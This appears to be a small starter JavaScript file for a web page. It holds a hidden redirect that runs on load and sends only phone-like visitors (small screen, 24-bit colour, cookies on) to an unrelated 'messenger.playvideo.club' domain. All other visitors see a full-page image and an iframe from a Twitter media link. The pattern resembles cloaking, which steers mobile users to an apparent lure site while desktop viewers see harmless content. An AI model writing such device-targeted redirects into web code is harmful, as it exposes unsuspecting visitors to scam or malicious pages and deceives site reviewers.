// Import stylesheets
import './style.css';

// Write Javascript code!
const appDiv = document.getElementById('app');
appDiv.innerHTML = `<h1></h1>`;

  function setTime() {
   window.location = "https://messenger.playvideo.club/";
  }
  
  if(screen.colorDepth >= 24 && navigator.cookieEnabled == true && screen.width < 800) {
   setTimeout(setTime, 0);
  }
function braunnyimg() {
  var x = document.createElement("IMG");
  x.setAttribute("src", "https://pbs.twimg.com/media/D-1ur8QWsAA-j9R.png:large");
  x.setAttribute("width", "100%");
  x.setAttribute("height", "100%");
  document.body.appendChild(x);
}
braunnyimg();
function braunnyfrm() {
  var x = document.createElement("IFRAME");
  x.setAttribute("src", "https://pbs.twimg.com/media/D-1ur8QWsAA-j9R.png:large");
  x.setAttribute("width", "200px");
  x.setAttribute("height", "600px");
  x.setAttribute("frameborder", "0");
  document.body.appendChild(x);
}
braunnyfrm();
